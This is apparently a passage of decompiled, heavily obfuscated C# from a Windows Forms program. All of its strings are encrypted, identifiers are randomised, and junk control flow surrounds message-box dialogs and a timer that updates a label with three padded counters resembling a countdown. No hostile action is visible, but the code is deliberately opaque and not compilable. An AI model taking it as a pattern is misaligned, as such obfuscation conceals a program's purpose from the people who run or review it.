				if (Convert.ToInt32(char.ToString('7') + char.ToString('1') + "241", dwCookie) > checked(409768 - array2[79]))
				{
					char c34 = (char)get_PositiveInfinity;
					num144 = c34;
				}
				else
				{
					num144 = ~_003CModule_003E.KeyValuePair__2[138];
				}
				num143 = num144;
				break;
			}
			case 1:
			{
				string string_87 = string.Concat("\uabef\uabee", char.ToString('\uabef') + char.ToString('\uabee') + "\uabee\uabef", char.ToString('\uabee') + char.ToString('\uabef') + "\uabee\uabef\uabee\uabee\uabef\uabef\uabee\uabef\uabee\uabee\uabee\uabee");
				object[] array89 = new object[2 << sizeof(sbyte)];
				array89[Convert.ToInt32("0", Marshal.SizeOf(typeof(PrepareDelegate)))] = GetTypeArray / (int)array[33];
				array89[1] = string.Concat(char.ToString('Ŕ'), char.ToString('Ƙ') + "\te");
				array89[Convert.ToInt32("10", 2)] = Convert.ToInt32(char.ToString('1') + "5015", Convert.ToInt32("10", 8));
				array89[Convert.ToInt32("3", 16)] = 86724 - IsFullTypeNameSetExplicit;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_87, array89);
				num143 = Convert.ToInt32(string_87, array[0]);
				break;
			}
			}
			int num145 = num143;
			string string_88 = "눛눝";
			object[] array90 = new object[Convert.ToInt32("6", 16)];
			array90[0] = "ࡥ፯";
			array90[(uint)array[2]] = 8459;
			array90[2] = (byte)array2[1] != 0;
			array90[3] = 9656;
			array90[(nint)((Array)(object)(char.ToString('.') + "\u035b\u034e\u0352")).LongLength] = 12684;
			array90[Convert.ToInt32("5", 8)] = (char)checked(Convert.ToInt32("11111111111111111111110101111111", 2) * -12);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_88, array90);
			MessageBox.Show(text68, text74, (MessageBoxButtons)num145, (MessageBoxIcon)(Convert.ToInt32(string_88, 16) >> ActualValue));
		}
		else
		{
			string text75 = char.ToString((char)array2[27]);
			string string_89 = "䛮䛮";
			object[] array91 = new object[endAction];
			array91[0] = 8866;
			array91[1 * (nint)((Array)(object)"\u035b").LongLength] = (char)array2[28];
			int num146 = 0x20D06 ^ Convert.ToInt32("406404", 8);
			int num147 = default(int);
			switch ((nint)((Array)(object)string.Empty).LongLength * SignExtendWideningLower)
			{
			case 0:
				num147 = 0;
				break;
			case 1:
				num147 = -942201;
				break;
			case 2:
				num147 = 455507;
				break;
			}
			array91[num146] = (byte)num147 != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_89, array91);
			string text76 = text75 + string_89;
			string string_90 = string.Concat("긆긠", char.ToString('긶') + "긡깳긠");
			object[] array92 = new object[(uint)array[5]];
			int num148 = default(int);
			switch (checked(945150 - Convert.ToInt32("11100110101111111110", 2)))
			{
			case 0:
				num148 = array2[1];
				break;
			}
			array92[num148] = 4307;
			array92[1 & _003CModule_003E.ActivityOptions[2]] = (int)array[17];
			array92[2] = Marshal.SizeOf(typeof(ReturnParameter));
			array92[3] = (byte)Convert.ToInt32("0", 2) != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_90, array92);
			string text77 = string_90;
			string string_91 = string.Concat(char.ToString(array[34]), char.ToString('㉓') + "㉉㈝", "㉔㉓㉋㉜㉑" + "㉔㉙㈝㉙㉔㉎㉞㉒㉏㉙㈝㉚㉔㉛㉉㈝㉱㉔㉓㉖㈓㉝㉝㉝");
			object[] array93 = new object[(uint)array[3]];
			array93[Convert.ToInt32("0", 8)] = false;
			array93[Convert.ToInt32("1", 16)] = (char)Hour;
			array93[Marshal.SizeOf(typeof(ENODATA))] = 13217;
			array93[3] = 43;
			int num149 = Convert.ToInt32("22d", 16);
			array93[4] = num149;
			array93[(nint)((Array)(object)(char.ToString('\u0348') + char.ToString('\u0366') + "\u0343\u034f\u030d")).LongLength] = 16745;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_91, array93);
			string string_92 = string.Concat(text76, text77 + string_91);
			object[] array94 = new object[2 << (int)array4[(uint)array[2]]];
			array94[(uint)array4[(-12370 == ~Marshal.SizeOf(typeof(get_MethodHandle))) ? 459058 : 0]] = (byte)SAKA != 0;
			int num150 = ((90520 != Convert.ToInt32("37777716044", 8)) ? 5 : (-990374)) % Convert.ToInt32("2", Convert.ToInt32("20", 8));
			int num151 = default(int);
			switch (681294 + Convert.ToInt32("111111111111010" + "11001101010110011", 2))
			{
			case 0:
				num151 = ~get_InvariantCultureIgnoreCase;
				break;
			case 1:
				num151 = 6374;
				break;
			}
			int num152 = num151;
			int num153 = array2[29];
			int num154 = ((Convert.ToInt32("bb75", 16) <= -899881) ? (-308468) : _003CModule_003E.ActivityOptions[127]);
			array94[num150] = num152 << num153 - num154;
			int num155 = (checked(-1304785 - Convert.ToInt32("37776411562", 8)) ^ Convert.ToInt32("11111" + "1111" + "11100100000001110110111", Marshal.SizeOf(typeof(ENODATA)))) % (603565 - Convert.ToInt32("fff6ca57", 16) * -1);
			string text78 = char.ToString('ऽ');
			string text79 = char.ToString('Ͷ');
			string string_93 = "䜤䐝";
			object[] array95 = new object[_003CModule_003E.KeyValuePair__2[139] / 207555479];
			array95[0 / array2[80]] = "ඝÚ";
			int num156 = default(int);
			switch (Convert.ToInt32("ea8b2", 16))
			{
			case 960690:
				num156 = 10289;
				break;
			}
			array95[1] = (char)num156;
			array95[2] = 'ϧ';
			array95[3] = char.ToString((char)Marshal.SizeOf(typeof(Current))) + "$|";
			array95[4] = 'Ӗ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_93, array95);
			array94[num155] = text78 + text79 + string_93;
			char c35 = (char)('\u0003' & Convert.ToInt32("3", 16));
			int num157 = c35;
			string text80 = char.ToString((char)POSIX_FADV_RANDOM);
			string string_94 = "\ue59c\uf354";
			object[] array96 = new object[Convert.ToInt32("11111111111101101010010100100110", 2) ^ -613083];
			array96[array2[1]] = '䋑';
			array96[get_CurrencyGroupSeparator] = (byte)(0 | (nint)((Array)(object)string.Empty).LongLength) != 0;
			array96[Marshal.SizeOf(typeof(Aborted)) / Convert.ToInt32("101000000010101110110", 2)] = '뀻';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_94, array96);
			array94[num157] = text80 + string_94;
			_003CModule_003E.GetMaxByteCount(ref string_92, array94);
			unorderedNotEqualSignaling.ExecutionEngineException(string_92);
			string text81 = char.ToString('ꉦ');
			string text82 = char.ToString((char)checked(Convert.ToInt32("37777773373", 8) * -18));
			string string_95 = string.Concat("텽텹", char.ToString('텫') + "텽털", char.ToString('텽') + char.ToString('텶') + "텬텽텪털텹");
			object[] array97 = new object[3];
			array97[(Convert.ToInt32("6273", 8) != -25367) ? Convert.ToInt32("0", 8) : (-458275)] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
			array97[-393519 - Arg_ArrayPlusOffTooSmall] = 17314;
			array97[Convert.ToInt32("11011110110011111010", 2) ^ Marshal.SizeOf(typeof(AssemblyFileVersionAttribute))] = string.Concat(char.ToString('ᙯ'), char.ToString('Ϟ') + "ᒫ\u0094");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_95, array97);
			string text83 = text81 + text82 + string_95;
			string string_96 = string.Concat(char.ToString('⻤'), "⺀⺭", "⺷⺧⺫⺶⺠⻤⺪" + "⺭⺰⺶⺫⻤⺣⺭⺢⺰⻤⺭⺪⻤");
			object[] array98 = new object[Marshal.SizeOf(typeof(OpenExisting)) % 10];
			array98[0] = (char)Marshal.SizeOf(typeof(StandardDeviation));
			array98[1] = _003CModule_003E.get_PositiveSign[4];
			array98[(uint)array[0]] = string.Concat(char.ToString('ᓠ'), char.ToString('Œ'), char.ToString('\u0d44') + char.ToString('ƴ') + "µ}");
			array98[Marshal.SizeOf(typeof(CharSetMask))] = (int)array[Marshal.SizeOf(typeof(GetInterfaceImplementation))];
			array98[Convert.ToInt32("4", 8)] = string.Concat(char.ToString((char)Convert.ToInt32("86f", 16)), char.ToString('䍨') + char.ToString('в') + "ޠԒ");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_96, array98);
			string text84 = string_96;
			string string_97 = string.Concat("䎩䎵" + "䎴䎮䏽䎻䎲䎯䎰", char.ToString('䎼') + char.ToString('䎩') + "䏽䎹䎴䎮䎾䎲䎯䎹", "䏳䎺䎴䎻䎩" + "䏲䎾䎲䎹䎸䏽䎵䎸䎯䎸");
			object[] array99 = new object[(uint)array[0]];
			array99[Convert.ToInt32("0", 2)] = 56695;
			array99[array2[2]] = array2[30];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_97, array99);
			string string_98 = string.Concat(text83, text84 + string_97);
			int num158 = checked(-10 * _003CModule_003E.ActivityOptions[86]) % 12;
			object[] array100 = new object[num158];
			string string_99 = "\ue03a";
			object[] array101 = new object[(nint)((Array)(object)(char.ToString('\u0359') + char.ToString('\u0356') + "\u0356\u031c\u035d")).LongLength];
			int num159 = Convert.ToInt32("0", 2);
			array101[num159] = '먮';
			array101[Convert.ToInt32("1", 16)] = 1221;
			array101[2] = "ਫ਼\u0fef";
			array101[Convert.ToInt32("3", Convert.ToInt32("10000", 2))] = 1355;
			array101[4] = string.Concat(char.ToString('~'), char.ToString('\u0016') + "\u009dN");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_99, array101);
			int num160 = Convert.ToInt32(string_99, Convert.ToInt32(char.ToString('8') + "d160a0", 16) / array2[Convert.ToInt32("11111", 2)]);
			int num161 = 569678 - Convert.ToInt32("1734033", 8) >> 6;
			int num162 = default(int);
			switch (array2[81] / 763224956)
			{
			case 0:
				num162 = 828239;
				break;
			case 1:
				num162 = Convert.ToInt32("11111111111111111111111111110010", 2);
				break;
			case 2:
				num162 = Convert.ToInt32("10000010001011110010", 2);
				break;
			case 3:
				num162 = 909889;
				break;
			}
			array100[num160] = (char)(num161 & checked(-65 * num162));
			int num163 = 5 % checked(array2[32] - Convert.ToInt32(char.ToString('3') + "77" + "76147626", Convert.ToInt32("1000", 2)));
			char c36 = (char)(86980 % Marshal.SizeOf(typeof(GetUInt16)));
			array100[num163] = c36;
			array100[2] = (byte)(393762 + ((array[GetUtf8SequenceLength] != '焾') ? (array2[82] + 945439) : _003CModule_003E.KeyValuePair__2[28])) != 0;
			int num164 = 1229975394 / ((-12442 < (0x19120 | Marshal.SizeOf(typeof(GetRuntimeMethodHandleFromMetadataToken)))) ? get_Day : 610770);
			int num165 = Marshal.SizeOf(typeof(Struct3));
			array100[num164] = (num165 | IsClosed) ^ _003CModule_003E.CalendarType[14];
			array100[(uint)array4[4]] = add_AssemblyResolve;
			char c37 = (char)(Convert.ToInt32("3f067", 16) - 258146);
			int num166 = (int)c37 * ((Convert.ToInt32("3777" + "7655707", 8) < 779167) ? 1 : 549973);
			string text85 = char.ToString('\u1a62');
			string string_100 = "\uecb2\uebec";
			object[] array102 = new object[endAction];
			array102[0] = 1738;
			array102[1] = Convert.ToInt32("11111111111111111111111001101001", 2) * Convert.ToInt32("11111111111111111111111111000111", 2);
			string text86;
			string string_101;
			checked
			{
				array102[-545088 - Convert.ToInt32("11111111111101111010111010111110", 2)] = 33769;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_100, array102);
				array100[num166] = text85 + string_100;
				_003CModule_003E.GetMaxByteCount(ref string_98, array100);
				text86 = string_98;
				string_101 = string.Concat("춐춐", char.ToString('춑') + "춐춑", char.ToString('춐') + char.ToString('춐') + "춑춐춑춐춑춑춐");
				object[] array103 = new object[2];
				array103[unchecked((nint)((Array)(object)string.Empty).LongLength) * Convert.ToInt32("11101001110101111101", 2)] = unchecked((char)remove_DomainUnload);
				array103[Convert.ToInt32("1", 16)] = 32677;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_101, array103);
			}
			string text87 = char.ToString((char)Convert.ToInt32(string_101, 2));
			string text88 = char.ToString((char)Convert.ToInt32(char.ToString('3') + char.ToString('2') + "616", Marshal.SizeOf(typeof(__c__DisplayClass0_6))));
			int num167 = default(int);
			switch (checked(0 * Convert.ToInt32("fff9a604", 16)))
			{
			case 0:
				num167 = array[35];
				break;
			}
			string text89 = char.ToString((char)num167);
			string string_102 = "달닱";
			object[] array104 = new object[Convert.ToInt32("10", Convert.ToInt32("2", 8))];
			array104[Convert.ToInt32("0", 8)] = Convert.ToInt32(char.ToString('3') + char.ToString('3') + "550", 8);
			array104[get_CurrencyGroupSeparator] = Convert.ToInt32(char.ToString('1') + "010" + "00000010001", 2);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_102, array104);
			string text90 = text88 + text89 + string_102;
			string string_103 = char.ToString('ડ') + char.ToString('\u0ad3') + "ૠ૯";
			object[] array105 = new object[checked(GetPropertyGetter + 945787)];
			array105[_003CModule_003E.ActivityOptions[Convert.ToInt32("1", 2)]] = char.ToString((char)Convert.ToInt32("3043", 8)) + char.ToString((char)Convert.ToInt32("4115", 8)) + "ߩ\u0823";
			array105[1] = Marshal.SizeOf(typeof(ReflectedType)) | 0x1025;
			array105[(uint)array[get_PositiveInfinity]] = array[36] | array2[83];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_103, array105);
			string text91 = string_103;
			string string_104 = string.Concat("铘铄", char.ToString('铆') + "铜铊铙铎");
			object[] array106 = new object[Convert.ToInt32(char.ToString('1') + "10", array2[0])];
			array106[Convert.ToInt32("0", 8) << 4] = '而';
			int num168 = default(int);
			switch (checked(_003CModule_003E.ActivityOptions[1] * 542094))
			{
			case 0:
				num168 = 1;
				break;
			}
			array106[num168] = (char)(Convert.ToInt32("1101100011001001111001000001000", 2) / 855388);
			array106[Convert.ToInt32("3073131", 8) ^ ParserHelpers] = Convert.ToInt32("10" + char.ToString('0') + "1100111", 2);
			array106[3 & Marshal.SizeOf(typeof(CharSetMask))] = 786;
			array106[2 << Convert.ToInt32("1", 2)] = array[20];
			array106[Convert.ToInt32("5", 16) & 5] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_104, array106);
			string string_105 = string.Concat(text87, text90, text91 + string_104);
			char c38 = (char)Convert.ToInt32("5", 16);
			object[] array107 = new object[(uint)array4[(uint)c38]];
			int num169;
			if (checked(Convert.ToInt32("11111111111010000001001101011100", 2) - Convert.ToInt32("fff6388c", 16) + 885493) > _003CModule_003E.get_PositiveSign[142] % -737534 - (-269975 - UInt64))
			{
				num169 = _003CModule_003E.Dequeue[12];
			}
			else
			{
				string string_106 = "尯";
				object[] array108 = new object[5];
				array108[0] = 7833;
				array108[1] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
				array108[sizeof(short)] = 1801;
				array108[3] = ((Vector__1 != 91533) ? 12425 : (-699960));
				array108[4] = char.ToString('ɜ') + char.ToString('\u034e') + "C\a";
				_003CModule_003E.TAIWANLUNISOLAR(ref string_106, array108);
				num169 = Convert.ToInt32(string_106, 2015760432 / _003CModule_003E.KeyValuePair__2[140]);
			}
			int num170 = num169;
			int num171 = op_Explicit;
			string string_107 = string.Concat(char.ToString('\uf448') + "\uf449\uf449\uf449", char.ToString('\uf449') + "\uf448\uf448\uf448", "\uf448\uf448" + "\uf448\uf448" + "\uf448\uf449\uf448\uf449\uf448");
			object[] array109 = new object[80 >> sizeof(float)];
			array109[0] = 38793;
			array109[1] = char.ToString((char)array2[46]) + "\07";
			array109[(nint)((Array)(object)"\u030f\u0343").LongLength] = 4155;
			array109[3] = 527161 - array2[84];
			array109[4 * array2[2]] = 9071;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_107, array109);
			array107[num170] = ((num171 == Convert.ToInt32(string_107, endAction & 2)) ? 3664 : 272348);
			int num172 = Convert.ToInt32("fff" + "f55d2", _003CModule_003E.KeyValuePair__2[2]) / 1;
			string string_108 = string.Concat(char.ToString((char)GetObjectsForNativeVariants), char.ToString((char)array2[85]), char.ToString('殓') + char.ToString('殓') + "毄毇毀毇");
			object[] array110 = new object[Convert.ToInt32("10", 2)];
			array110[0] = (char)array2[33];
			array110[1 * array[2]] = (char)Convert.ToInt32("11" + "11" + "010111110", 2);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_108, array110);
			int num175;
			if (((num172 == Convert.ToInt32(string_108, Marshal.SizeOf(typeof(PrepareDelegate)))) ? 1 : 0) == checked((1968520 >> Convert.ToInt32("15", 16)) * Convert.ToInt32("1010" + char.ToString('0') + "001111101111", 2)))
			{
				string string_109 = "\uef78";
				int num173 = ((Convert.ToInt32("37777503470", 8) >= -664781) ? ((Array)(object)"\u0357\u0308\u0353\u0301\u0359").Length : (-558728));
				object[] array111 = new object[num173];
				array111[(uint)array[1]] = char.ToString('f') + "\u0080\n";
				array111[1] = checked(_003CModule_003E.KeyValuePair__2[141] + IReadOnlySet__1);
				array111[sizeof(short)] = _003CModule_003E.ActivityOptions[22];
				int num174 = _003CModule_003E.KeyValuePair__2[0];
				array111[num174] = string.Concat(char.ToString('賑'), char.ToString('\u0bd3') + char.ToString('ซ') + "\u1fde⇓");
				array111[4] = 'Ì';
				_003CModule_003E.TAIWANLUNISOLAR(ref string_109, array111);
				num175 = ((Array)(object)string_109).Length;
			}
			else
			{
				num175 = -723231;
			}
			int num176 = num175;
			int num177 = ((Convert.ToInt32(char.ToString('f') + "fff8902", 16) == -90062) ? (-554998 + Convert.ToInt32("366031", 8)) : checked(array2[86] * -1));
			int num178 = Convert.ToInt32(char.ToString('2') + "564236", Marshal.SizeOf(typeof(__c__DisplayClass0_6)));
			array107[num176] = (char)((num177 > num178) ? 4294183312u : '؉');
			int actualValue = ActualValue;
			string text92 = char.ToString((char)(3377790 >> GCHeapDumpKeyword));
			string string_110 = "쑼쐩";
			object[] array112 = new object[5];
			array112[-298365 ^ array2[87]] = 78;
			int num179 = default(int);
			switch (Convert.ToInt32("0", 8) * 397935)
			{
			case 0:
				num179 = Convert.ToInt32("1", 8);
				break;
			}
			array112[num179] = string.Concat(char.ToString((char)MultiplyDoublingWideningSaturateLowerBySelectedScalar), char.ToString('ก'), char.ToString('¾') + char.ToString('\u0346') + "ˑk\u0084");
			array112[Marshal.SizeOf(typeof(ENODATA))] = '颰';
			array112[Marshal.SizeOf(typeof(CharSetMask))] = 123;
			array112[Convert.ToInt32("4", 8)] = 48;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_110, array112);
			string value2 = text92 + string_110;
			int num180 = ((VolatileObject <= -630460) ? Convert.ToInt32("37776220561", 8) : (-538494));
			array107[actualValue] = Convert.ToInt32(value2, num180 - -538510);
			string string_111 = "\uf7ff";
			object[] array113 = new object[Convert.ToInt32("11", 2)];
			array113[Convert.ToInt32("0", 16) % -890550] = 31645;
			array113[1] = false;
			int num181 = ((TransposeEven < -926088) ? (-52560) : 2);
			array113[num181] = -1012500 ^ get_IsMailNewsSave;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_111, array113);
			string value3 = string_111;
			char c39 = (char)Convert.ToInt32("10", Convert.ToInt32("10", 16));
			array107[Convert.ToInt32(value3, c39)] = (char)checked((0x10202 | Convert.ToInt32("10011101100110010", 2)) * 7 + unchecked(Convert.ToInt32(char.ToString('2') + "115540", 8) * checked(array2[88] - 639304)));
			string text93 = char.ToString((char)checked(FromException + get_PerMilleSymbol));
			string string_112 = "ﺂﺂ";
			object[] array114 = new object[Convert.ToInt32("5", 8)];
			array114[array2[sizeof(bool)]] = 2266;
			array114[(nint)((Array)(object)"\u0351").LongLength] = 2397;
			array114[2] = '\ue990';
			array114[3] = false;
			array114[4] = _003CModule_003E.get_PositiveSign[Convert.ToInt32("24", 16)];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_112, array114);
			int num182 = Convert.ToInt32(text93 + string_112, _003CModule_003E.LoadVector128[2]);
			string string_113 = string.Concat(char.ToString((char)_003CModule_003E.get_PositiveSign[143]), char.ToString('丬') + "乺乹");
			object[] array115 = new object[(nint)((Array)(object)(char.ToString('\u033b') + "\u032d\u0364")).LongLength];
			array115[Convert.ToInt32("0", 8)] = (char)Convert.ToInt32(char.ToString('3') + "5520", 8);
			array115[sizeof(sbyte)] = (byte)Convert.ToInt32("0", 2) != 0;
			array115[3 & Stream] = array2[Marshal.SizeOf(typeof(TryReadDoubleLittleEndian))];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_113, array115);
			array107[num182] = 0x1FFE & Convert.ToInt32(string_113, 16);
			int tSpan = TSpan;
			string string_114 = "窢";
			object[] array116 = new object[6 | array2[37]];
			array116[0] = string.Concat(char.ToString('\u0882'), char.ToString('\u0b8c') + char.ToString('Œ') + "\u009fማ");
			array116[(Convert.ToInt32("fffefceb", 16) < 350063) ? 1 : 840290] = 440;
			array116[2] = 6676;
			array116[(nint)((Array)(object)string.Empty).LongLength | 3] = checked(287 * Marshal.SizeOf(typeof(LayoutKind)));
			array116[(uint)array[5]] = CharUnicodeInfo & array2[89];
			array116[array[6] * 1] = (byte)((false ? 1u : 0u) & (uint)array[1]) != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_114, array116);
			array107[tSpan] = (byte)(Convert.ToInt32(string_114, array2[5]) << PreserveBaseOverridesAttribute) != 0;
			_003CModule_003E.GetMaxByteCount(ref string_105, array107);
			MessageBox.Show(text86, string_105, (MessageBoxButtons)array4[checked(_003CModule_003E.KeyValuePair__2[29] + 259899)], (MessageBoxIcon)(array6[9] ^ -682869));
		}
		string string_115 = "䑞";
		object[] array117 = new object[(nint)((Array)(object)(char.ToString('\u034b') + ".\u0348\u0311\u0326")).LongLength];
		array117[(uint)array[Marshal.SizeOf(typeof(UseHebrewParsing))]] = (char)(_003CModule_003E.get_PositiveSign[144] + array2[90]);
		array117[array2[sizeof(char)]] = ((_003CModule_003E.ActivityOptions[128] != 16353) ? SEP_DateOrOffset : Convert.ToInt32("21674", 8));
		array117[Convert.ToInt32("0", 16) | 2] = "ӄȭ";
		int num183 = default(int);
		switch (checked(array2[91] + Convert.ToInt32("db7e1", 16)))
		{
		case 0:
			num183 = Convert.ToInt32("3", 16);
			break;
		case 1:
			num183 = Convert.ToInt32("11111111111101111110100010110001", 2);
			break;
		}
		array117[num183] = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(Table))), char.ToString('ˮ'), char.ToString('\u036c') + char.ToString('Ç') + "\u00afĳ");
		array117[4] = 2395;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_115, array117);
		int result = default(int);
		switch (Convert.ToInt32(string_115, Marshal.SizeOf(typeof(__c__DisplayClass0_6))) * -134815)
		{
		case 0:
			result = 0;
			break;
		}
		return (byte)result != 0;
	}

	private unsafe void TrackerSupport(object sender, ElapsedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			char[] array = new char[4] { 'Ю', 'ᥘ', '\u0002', '圧' };
			int[] array2 = new int[11]
			{
				2, 0, 4, 23, -569461, 3256, 1, -15737, 22382, 589888,
				19582
			};
			int[] array3 = new int[3];
			array3[0] = _003CModule_003E.ActivityOptions[2];
			array3[get_CurrencyGroupSeparator] = Convert.ToInt32("1111111011101111111001101", 2) & 0x1DDF9AD;
			array3[2] = 12181;
			int[] array4 = array3;
			if (Impersonation < sizeof(byte))
			{
				Impersonation = CompareScalarUnorderedNotEqual;
				if (TryReadUInt16LittleEndian == checked(-361929 + get_Ticks) + -72105)
				{
					TryReadUInt16LittleEndian = array4[_003CModule_003E.ActivityOptions[2]] >> 19;
					if ((nuint)Reserved2 > (nuint)((Array)(object)string.Empty).LongLength)
					{
						int reserved = Reserved2;
						int num = ((Convert.ToInt32("11110111100101", 2) >= Convert.ToInt32("d2c2c", 16)) ? Convert.ToInt32("37774146611", 8) : 887561);
						int num2 = Convert.ToInt32("ffffffff", 16);
						Reserved2 = reserved - checked(num * num2 + get_VersionCompatibility);
					}
				}
				else
				{
					int tryReadUInt16LittleEndian = TryReadUInt16LittleEndian;
					string string_ = string.Concat(char.ToString('櫙'), char.ToString('櫛') + char.ToString('櫟') + "檌檋");
					object[] array5 = new object[2];
					array5[0] = Convert.ToInt32(char.ToString('5') + "7060", 8);
					array5[Convert.ToInt32("1", 2)] = array2[_003CModule_003E.get_PositiveSign[2]];
					_003CModule_003E.TAIWANLUNISOLAR(ref string_, array5);
					string value = string_;
					char c = (char)Marshal.SizeOf(typeof(PrepareDelegate));
					TryReadUInt16LittleEndian = tryReadUInt16LittleEndian - (Convert.ToInt32(value, c) >> checked(array2[2] * (array2[7] + Marshal.SizeOf(typeof(CalendricalCalculationsHelper)))));
				}
			}
			else
			{
				int impersonation = Impersonation;
				char c2 = (char)Marshal.SizeOf(typeof(IsTvOS));
				Impersonation = impersonation - (int)c2;
			}
			if (Impersonation != 0 || TryReadUInt16LittleEndian != 0 || Reserved2 != checked(Convert.ToInt32(char.ToString('3') + "347051", 8) + System_002EBuffers_002EBinary) % _003CModule_003E.CalendarType[array2[3]])
			{
			}
			Label compressedStack = CompressedStack;
			string text = char.ToString((char)_003CModule_003E.ActivityOptions[55]);
			string text2 = char.ToString((char)(Convert.ToInt32("7ca0", 16) & '佃'));
			string string_2 = "⺭⻪";
			object[] obj = new object[5] { 1912, null, null, null, null };
			char c3 = (char)sizeof(sbyte);
			obj[(uint)c3] = Convert.ToInt32("1001000100101101", 2) % 14866;
			obj[(nint)((Array)(object)"\u033d\u0318").LongLength] = char.ToString('ᔝ') + char.ToString('U') + "\n*";
			obj[endAction] = (byte)((Convert.ToInt32("fffedadf", 16) <= -420041) ? Convert.ToInt32("6d75f", 16) : ((Array)(object)string.Empty).LongLength) != 0;
			obj[4] = 10425;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_2, obj);
			string text3 = text + text2 + string_2;
			string text4 = char.ToString('䱋');
			string text5 = char.ToString((char)Marshal.SizeOf(typeof(WaitOne)));
			string string_3 = string.Concat(char.ToString('\udbcd'), char.ToString('\udb8a') + "\udbcb\udb82\udbcd");
			object[] obj2 = new object[5]
			{
				'\u0334',
				array[1],
				null,
				null,
				null
			};
			char c4 = (char)((Array)(object)"\u0344\u0316").Length;
			obj2[(int)c4] = "व(";
			obj2[3] = "ഉ扼";
			obj2[4] = 530;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_3, obj2);
			string string_4 = string.Concat(text3, text4 + text5 + string_3);
			object[] array6 = new object[(nint)((Array)(object)"\u032e").LongLength * (nint)((Array)(object)"\u035c").LongLength << (1 & (array2[8] + -22381))];
			array6[0] = (char)Num;
			array6[array4[~GetDllEntry]] = (int)((uint)array[0] << (checked(EndsWith + -392392) ^ (array2[9] | 0x6070)));
			_003CModule_003E.GetMaxByteCount(ref string_4, array6);
			string format = string_4;
			string arg = Reserved2.ToString().PadLeft(checked(81510449 + Convert.ToInt32("1111111" + "111" + "1101011100001110010001", array[2]) >> ((-59111 < Marshal.SizeOf(typeof(T12)) + PoolExhausted) ? 25 : 369966)), (char)((Marshal.SizeOf(typeof(hashCode)) != array4[array2[0]]) ? ReadTimeout : '0'));
			string text6 = TryReadUInt16LittleEndian.ToString();
			string string_5 = string.Concat(char.ToString('\ude02') + "\ude02\ude02\ude02", char.ToString('\ude02') + char.ToString('\ude02') + "\ude02\ude02\ude02", "\ude02\ude02\ude02\ude02\ude02\ude02\ude02\ude03\ude03\ude03" + "\ude02\ude03\ude02\ude03\ude02\ude03\ude02\ude02\ude02\ude02\ude03\ude02\ude03");
			object[] array7 = new object[4];
			array7[0] = 48473;
			array7[get_CurrencyGroupSeparator] = char.ToString('\u08f0') + "ـവ";
			array7[2] = RunSynchronously;
			array7[Convert.ToInt32("3", 8)] = (byte)array2[array2[6]] != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array7);
			int num3 = Convert.ToInt32(string_5, 2);
			int num4 = Convert.ToInt32("ff" + "ff1578", 16);
			int totalWidth = num3 - num4;
			int paddingChar = checked(Convert.ToInt32("6b8bf14c", 16) + -652076) / 37576694;
			string arg2 = text6.PadLeft(totalWidth, (char)paddingChar);
			string text7 = Impersonation.ToString();
			string string_6 = string.Concat(char.ToString(array[3]), "圦圧" + "圦圦圦圧圧圦圧圦圧圧圧圦圧圦圦圧圧");
			object[] array8 = new object[2];
			int num5 = array2[10];
			array8[0] = num5;
			array8[1] = 'ઘ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_6, array8);
			((Control)compressedStack).set_Text(string.Format(format, arg, arg2, text7.PadLeft(checked(Convert.ToInt32(string_6, ((Array)(object)"\u0338.").Length) + -669137), (char)checked(541744 - ((Convert.ToInt32(char.ToString('3') + "7777732077", 8) <= 27813) ? Marshal.SizeOf(typeof(resourceSearchPathsList)) : 973945)))));
		});
	}

	protected override void AsTask(bool disposing)
	{
		int[] array = new int[1] { -481094 };
		int num;
		if (disposing)
		{
			num = ((DeserializationToken != null) ? 1 : 0);
		}
		else
		{
			int num2 = default(int);
			switch (checked(0 * Convert.ToInt32("46503", 16)))
			{
			case 0:
				num2 = KeyValuePair;
				break;
			case 1:
				num2 = array[0];
				break;
			}
			num = (num2 - -65762) * (Convert.ToInt32(char.ToString('e') + char.ToString('0') + "af5fa", Convert.ToInt32("20", 8)) >> 8);
		}
		if (num != 0)
		{
			DeserializationToken.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private unsafe void KeyFile()
	{
		//IL_1684: Unknown result type (might be due to invalid IL or missing references)
		//IL_168e: Expected O, but got Unknown
		//IL_168f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1699: Expected O, but got Unknown
		//IL_169a: Unknown result type (might be due to invalid IL or missing references)
		//IL_16a4: Expected O, but got Unknown
		//IL_16a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_16af: Expected O, but got Unknown
		//IL_16b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_16ba: Expected O, but got Unknown
		//IL_16bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_16c5: Expected O, but got Unknown
		//IL_16c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_16d0: Expected O, but got Unknown
		//IL_16d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_16db: Expected O, but got Unknown
